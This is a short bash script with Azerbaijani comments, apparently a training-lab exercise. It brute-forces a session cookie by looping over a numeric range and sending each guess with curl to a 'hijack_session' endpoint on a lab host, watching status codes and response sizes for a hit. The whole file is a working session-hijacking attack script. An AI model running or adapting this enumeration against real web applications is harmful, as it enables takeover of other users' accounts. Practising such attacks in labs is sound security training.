#!/bin/bash
3
# Ehtimal edilən dar aralıq
for j in {17735254210..17735255000}; do
    COOKIE="hijack_session=4bd49cfb-c104-44a1-aef-5024948-$j"

    # -s: Səssiz rejim
    # -o /dev/null: Səhifənin HTML məzmununu ekrana çap etmə (gizlət)
    # -w: Yalnız bizə lazım olanı (Status kodu və Ölçünü) göstər
    # -b: Cookie-ni göndər

    RESULT=$(curl -s -o /dev/null -w "Status Kodu: %{http_code} | Ölçü: %{size_download} bayt" -b "$COOKIE" "http://web0x01.hbtn/a1/hijack_session/")

    echo "[*] Sonluq $j yoxlanılır -> $RESULT"
done
